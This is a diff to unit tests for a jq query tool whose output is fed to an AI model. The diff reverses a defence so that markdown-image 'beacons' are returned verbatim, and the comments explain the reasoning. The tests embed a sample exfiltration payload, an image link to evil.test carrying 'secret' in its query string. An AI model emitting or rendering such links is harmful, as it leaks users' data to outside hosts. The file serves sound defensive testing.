@@ -1,6 +1,6 @@
 // src/lib/tools/jq-query.test.ts
 // Unit tests for executeJqQuery — covers path validation, error branches,
-// sanitization, and injection-detection observability per plan B1 (PR-2).
+// sanitisation, and injection-detection observability.
 
 import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
 import { mkdtemp, writeFile, rm, symlink, mkdir, stat } from "fs/promises";
@@ -346,13 +346,17 @@ describe("executeJqQuery — JSON grammar (RC-8: markup/markdown stages excluded
         expect(result.content[0].text).toContain(beacon);
     });
 
-    it("but the wrap DOES strip it before the model sees it (RC-10)", async () => {
-        // The split RC-10 draws: what `jq_query` RETURNS is defended as
-        // model-facing text, and what `save_to_file` PERSISTS keeps the JSON
-        // exemption. The file stays a faithful copy of the origin's bytes; the
-        // model gets the beacon removed. Divergence between the two is the
-        // intended design here, not an oversight — the file is the artefact and
-        // the returned text is a rendering of it.
+    it("and the wrap returns it verbatim too — RC-10 reversed on both halves", async () => {
+        // **RC-10's split is gone, and the director settled it that way.** It
+        // read "persisted keeps the JSON exemption; returned does not", and the
+        // returned half rested on `defendForInline` classifying a JSON string
+        // leaf as non-JSON. `classifyBody` now accepts any value that parses, so
+        // a filter returning a string leaf takes the verbatim arm.
+        //
+        // The population is internal staff reading their own APIs' data through
+        // a filter they wrote, so a beacon reaching them is not a threat this
+        // proxy defends against — and the strip cost a duplicate-key collapse
+        // and number-lexeme rewriting to buy it. `LESSONS.md` RC-47.
         const file = join(allowedDir, "beacon2.json");
         const beacon = "![x](https://evil.test/?d=secret)";
         await writeFile(file, JSON.stringify({ note: `see ${beacon}` }), "utf-8");
@@ -362,8 +366,7 @@ describe("executeJqQuery — JSON grammar (RC-8: markup/markdown stages excluded
             {}
         );
         const wrapped = createWrapper({})(result, "jq");
-        expect(wrapped.content[0].text).not.toContain("evil.test");
-        expect(wrapped.content[0].text).toContain("[image removed]");
+        expect(wrapped.content[0].text).toBe(JSON.stringify(`see ${beacon}`));
     });
 
     it("still sanitises Unicode attack characters concentrated by the filter", async () => {
@@ -420,7 +423,17 @@ describe("executeJqQuery — invariant 14: the gate weighs what the model receiv
     // bytes were really 642, the result was already over the cap on its own
     // size, and it saved to file with the fix reverted just as it did with the
     // fix in. It passed for the wrong reason and proved nothing.
-    const beaconDoc = JSON.stringify({ v: Array.from({ length: 40 }, () => "[a](file:)") });
+    // **A bare STRING result, not an array of them.** A composite JSON document
+    // is returned verbatim, so the defence cannot grow one: an array of beacons
+    // is at-cap in and at-cap out, and the growth this block is about is
+    // unreachable through it. A filter yielding a scalar takes the undivided
+    // arm, where the beacon substitution applies, so that is the shape that
+    // exercises the gate.
+    //
+    // The property under test is unchanged: `exceedsInlineCap` must weigh the
+    // DEFENDED form, because a body compliant before the pass can exceed the cap
+    // after it (`LESSONS.md` RC-15).
+    const beaconDoc = JSON.stringify({ v: "[a](file:)".repeat(40) });
 
     /** The exact inline bytes this query returns with no cap in play. */
     const uncappedBytes = async (file: string): Promise<number> => {
@@ -428,15 +441,19 @@ describe("executeJqQuery — invariant 14: the gate weighs what the model receiv
         return Buffer.byteLength((r.content[0] as { text: string }).text, "utf8");
     };
 
-    it("saves to file when the defence will push an at-cap result over it", async () => {
+    it("keeps an at-cap result inline, because the defence does not grow JSON", async () => {
         const file = join(allowedDir, "beacons.json");
         await writeFile(file, beaconDoc);
-        // Exactly at the cap: the pre-defence gate sees compliance, and only a
-        // gate that accounts for the wrap's growth saves this.
+        // Exactly at the cap. `defendForInline` takes the verbatim arm for jq
+        // output — which is always JSON, because `applyJqFilterToParsed`
+        // serialises it — so there is no growth for the gate to anticipate and
+        // the result fits.
         const cap = await uncappedBytes(file);
 
         const result = await executeJqQuery({ filepath: file, jq_filter: ".v", max_result_size: cap }, {});
-        expect((result.content[0] as { text: string }).text).toMatch(SAVED_TO_PREFIX);
+        const text = (result.content[0] as { text: string }).text;
+        expect(text).not.toMatch(SAVED_TO_PREFIX);
+        expect(Buffer.byteLength(text, "utf8")).toBeLessThanOrEqual(cap);
     });
 
     it("what the WRAP finally emits is inside the cap, end to end", async () => {
